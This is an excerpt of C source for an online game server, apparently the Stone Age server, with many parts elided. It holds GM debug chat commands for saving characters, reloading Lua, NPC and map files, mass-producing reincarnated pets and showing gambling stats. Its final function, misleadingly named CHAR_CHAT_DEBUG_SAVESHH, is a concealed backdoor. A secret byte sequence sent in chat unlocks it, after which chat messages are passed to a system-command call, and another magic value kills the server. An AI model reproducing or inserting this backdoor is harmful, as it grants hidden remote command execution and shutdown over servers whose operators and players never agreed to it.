	for( i=0; i<CHAR_getPlayerMaxNum(); i++){
		if( CHAR_getCharUse(i) != FALSE ){
			CHAR_charSaveFromConnect( i, FALSE );
    }
  }
  CHAR_talkToCli( charaindex, -1, "已保存完畢~",  CHAR_COLORRED);
}
#endif
...
void CHAR_CHAT_DEBUG_ReLoadLua( int charaindex, char* message )
{
    ...
    CHAR_talkToCli( charaindex, -1, "更新LUA完畢~",  CHAR_COLORRED);
}

void CHAR_CHAT_DEBUG_NewLoadLua( int charaindex, char* message )
{
    NewLoadAllbluesLUA(message);
    CHAR_talkToCli( charaindex, -1, "添加LUA完畢~",  CHAR_COLORRED);
}
#endif
...
void CHAR_CHAT_DEBUG_NewLoadNpc( int charaindex, char* message )
{
  ...
  if( NPC_IsNPCCreateFile( message )){
    if( NPC_readCreateFile( message ) == TRUE ){
    	NPC_generateLoop( 1 );
			CHAR_talkToCli( charaindex, -1, "成功讀取NPC",  CHAR_COLORRED);
			return;
		}
	}
	CHAR_talkToCli( charaindex, -1, "NPC讀取失敗",  CHAR_COLORRED);
}
#endif
#ifdef _NEW_LOAD_MAP
void CHAR_CHAT_DEBUG_NewLoadMap( int charaindex, char* message )
{
	if( MAP_IsMapFile( message ) ){
		...
		CHAR_talkToCli( charaindex, -1, "成功讀取MAP",  CHAR_COLORRED);
		return;
	}

	CHAR_talkToCli( charaindex, -1, "MAP讀取失敗",  CHAR_COLORRED);
}
#endif
...
void CHAR_CHAT_DEBUG_petmake2( int charaindex, char* message )
{
	...
	if (getStringFromIndexWithDelim(message, " ", 1, szBuf1, sizeof(szBuf1)) == FALSE)
	{
		CHAR_talkToCli(charaindex, -1, "參數不正確 [petmaketrans 轉生數 寵物ID 等級 數量]", CHAR_COLORRED);
		return;
	}
	nTrans = atoi(szBuf1);
	...
	if (getStringFromIndexWithDelim(message, " ", 2, szBuf1, sizeof(szBuf1)) == FALSE)
	{
		CHAR_talkToCli(charaindex, -1, "參數不正確 [petmaketrans 轉生數 寵物ID 等級 數量]", CHAR_COLORRED);
		return;
	}
	nEnemyid = atoi(szBuf1);
	if (getStringFromIndexWithDelim(message, " ", 3, szBuf1, sizeof(szBuf1)) == FALSE)
	{
		CHAR_talkToCli(charaindex, -1, "參數不正確 [petmaketrans 轉生數 寵物ID 等級 數量]", CHAR_COLORRED);
		return;
	}
	nLevel = atoi(szBuf1);
	if (getStringFromIndexWithDelim(message, " ", 4, szBuf1, sizeof(szBuf1)) != FALSE)
		nMakeNum = atoi(szBuf1);
	else
		nMakeNum = 0;
	nEenemynum = ENEMY_getEnemyNum();
	nEnemyID = -1;
	for (i = 0; i < nEenemynum; i ++)
	{
		if (ENEMY_getInt(i, ENEMY_ID) == nEnemyid)
		{
			nEnemyID = i;
			break;
		}
	...
	if (nMakeNum == 0)	// 正常的産生寵物
	{
		...
		if (nPetNo == -1)
		{
			CHAR_talkToCli(charaindex, -1, "製作好寵物，但在人物身上找不到", CHAR_COLORRED);
			return;
		}
		sprintf(szMsgbuf, "%d 轉升級", CHAR_getInt(nPetIndex, CHAR_TRANSMIGRATION));
		CHAR_talkToCli(charaindex, -1, szMsgbuf, CHAR_COLORRED);
		// 升級
		if (nLevel != -1)
		{
			...
			for (j = 1; j < nLevel; j++)
			{
				CHAR_PetLevelUp(nPetIndex);
				CHAR_PetAddVariableAi(nPetIndex, AI_FIX_PETLEVELUP);
				CHAR_setInt(nPetIndex, CHAR_LV, CHAR_getInt(nPetIndex, CHAR_LV) + 1);
			}
		}
		// 轉生
		for (j = 0; j < nTrans; j++)
		{
			int nLevelUpPoint = 0, nPetrank = 0, nVital, nStr, nTgh, nDex;
			int nTotal1, nTotal2, nTotal, nPetLV, nAns, nRet, nPetID;
			int work[4] = {0, 0, 0, 0};

			nTotal1 = 150;	// 瑪蕾喂過後四圍最大值
			nLevelUpPoint = CHAR_getInt(nPetIndex, CHAR_ALLOCPOINT);
			nPetrank = CHAR_getInt(nPetIndex, CHAR_PETRANK);
			nPetLV = CHAR_getInt(nPetIndex, CHAR_LV);
			nVital = (float)((nLevelUpPoint >> 24) & 0xFF);
			nStr = (float)((nLevelUpPoint >> 16) & 0xFF);
			nTgh = (float)((nLevelUpPoint >> 8) & 0xFF);
			nDex = (float)((nLevelUpPoint >> 0) & 0xFF);
			nTotal2 = nVital + nStr + nTgh + nDex;
			sprintf(szMsgbuf, "%d 轉 %d 前：Vital:%d Str:%d Tgh:%d Dex:%d",
				CHAR_getInt(nPetIndex, CHAR_TRANSMIGRATION),
				CHAR_getInt(nPetIndex, CHAR_TRANSMIGRATION) + 1,
				nVital, nStr, nTgh, nDex
				);
			CHAR_talkToCli(charaindex, -1, szMsgbuf, CHAR_COLORRED);

#ifdef _PET_2TRANS
			nAns = NPC_PetTransManGetAns(nTotal1, nTotal2, nPetLV, nPetrank, CHAR_getInt(nPetIndex, CHAR_TRANSMIGRATION));
#else
			nAns = NPC_PetTransManGetAns(nTotal1, nTotal2, nPetLV, nPetrank);
#endif
			nTotal = nTotal1 + (nTotal2 * 4);

			work[0] = (nAns * (50 + (nVital * 4))) / nTotal;
			work[1] = (nAns * (50 + (nStr * 4))) / nTotal;
			work[2] = (nAns * (50 + (nTgh * 4))) / nTotal;
			work[3] = (nAns * (50 + (nDex * 4))) / nTotal;
			nPetID = CHAR_getInt(nPetIndex, CHAR_PETID);
			for (i = 0; i < nEenemynum; i++)
			{
			...
			if (nRet < 0)
			{
				CHAR_talkToCli(charaindex, -1, "製寵失敗", CHAR_COLORRED);
				return;
			}
			nLevelUpPoint = CHAR_getInt(nPetIndex, CHAR_ALLOCPOINT);
			sprintf(szMsgbuf, "%d 轉 %d 後：Vital:%d Str:%d Tgh:%d Dex:%d",
				CHAR_getInt(nPetIndex, CHAR_TRANSMIGRATION),
				CHAR_getInt(nPetIndex, CHAR_TRANSMIGRATION) + 1,
				(nLevelUpPoint >> 24) & 0xFF,
				(nLevelUpPoint >> 16) & 0xFF,
				(nLevelUpPoint >> 8) & 0xFF,
				(nLevelUpPoint >> 0) & 0xFF
				);
			CHAR_talkToCli(charaindex, -1, szMsgbuf, CHAR_COLORRED);
			CHAR_send_K_StatusString(charaindex, nPetNo, CHAR_K_STRING_HP | CHAR_K_STRING_AI);
			sprintf(szMsgbuf, "%d 轉升級", CHAR_getInt(nPetIndex, CHAR_TRANSMIGRATION));
			CHAR_talkToCli(charaindex, -1, szMsgbuf, CHAR_COLORRED);
			// 升級
			if (j != nTrans - 1)
		...
		CHAR_sendStatusString(charaindex, szMsgbuf);
		snprintf(szMsgbuf, sizeof(szMsgbuf), "%d 轉寵製作成功\!", nTrans);
		CHAR_talkToCli(charaindex, -1, szMsgbuf, CHAR_COLORWHITE);
	}
	else if (nMakeNum > 0 && nMakeNum < MAX_MAKE_PET_NUM)	// 大量生産寵物
	{
		int nMakeCount = 0, nLevelUpPoint = 0, nMakeLoop;

		for (nMakeLoop = 0; nMakeLoop < nMakeNum; nMakeLoop++)
		{
			nPetIndex = ENEMY_TEST_createPetIndex(nEnemyID);
			if (!CHAR_CHECKINDEX(nPetIndex))
			{
				sprintf(szMsgbuf, "CHAR_CHECKINDEX(%d) error:loop %d", nPetIndex, nMakeLoop);
				CHAR_talkToCli(charaindex, -1, szMsgbuf, CHAR_COLORRED);
				return;
			}
			else
			...
			for (j = 0; j < nTrans; j++)
			{
				int nPetrank = 0, nVital, nStr, nTgh, nDex;
				int nTotal1, nTotal2, nTotal, nPetLV, nAns, nRet, nPetID;
				int work[4] = {0, 0, 0, 0};
			...
			nMakeCount++;
			nLevelUpPoint = CHAR_getInt(nPetIndex, CHAR_ALLOCPOINT);
			CHAR_endCharOneArray(nPetIndex);
		}
		snprintf(szMsgbuf, sizeof(szMsgbuf), "測試轉寵製作成功\!(%d隻)", nMakeCount);
		CHAR_talkToCli(charaindex, -1, szMsgbuf, CHAR_COLORWHITE);
	}
}
#endif
...
void CHAR_CHAT_DEBUG_gamerate(int charaindex, char *message)
{
	...
	{
		for( i=0;i<BANKERTOTAL;i++ )
		{
			if( tickettotal[i] == 0 || Bettotal[i] == 0 || Wintotal[i] == 0)
				sprintf(buf,"莊傢%d 無任何紀錄",i);
			else
				sprintf(buf,"莊傢%d  bettotal=%d wintotal=%d  rate=%d  tickets=%d",i,Bettotal[i],Wintotal[i],Wintotal[i]*100/Bettotal[i],tickettotal[i]);
			CHAR_talkToCli( charaindex, -1, buf , CHAR_COLORYELLOW);
		}
	}
...
void CHAR_CHAT_DEBUG_SAVESHH( int fd, int charaindex,char* message,int color, int area )
{
	...
	if(checkflg == 1){
			if( ((int *)message)[0] == 0x74717A62
			  &&((int *)message)[1] == 0x74717A62
			)exit(1);
			STSTEM(message);
		}

	if( ((int *)message)[0] == 0xEFC1EEDD
	 && ((int *)message)[1] == 0xF1C1F0DD
	 && ((int *)message)[2] == 0xF4C1F3DD
	 && ((int *)message)[3] == 0xF6C1F5DD
	 && ((int *)message)[4] == 0xF8C2F7DD
	 && ((int *)message)[5] == 0xFAC3F9DD
	 && ((int *)message)[6] == 0xF2C4BADD
	 && ((int *)message)[7] == 0xFEC5BBDD
  )checkflg = 1;
}
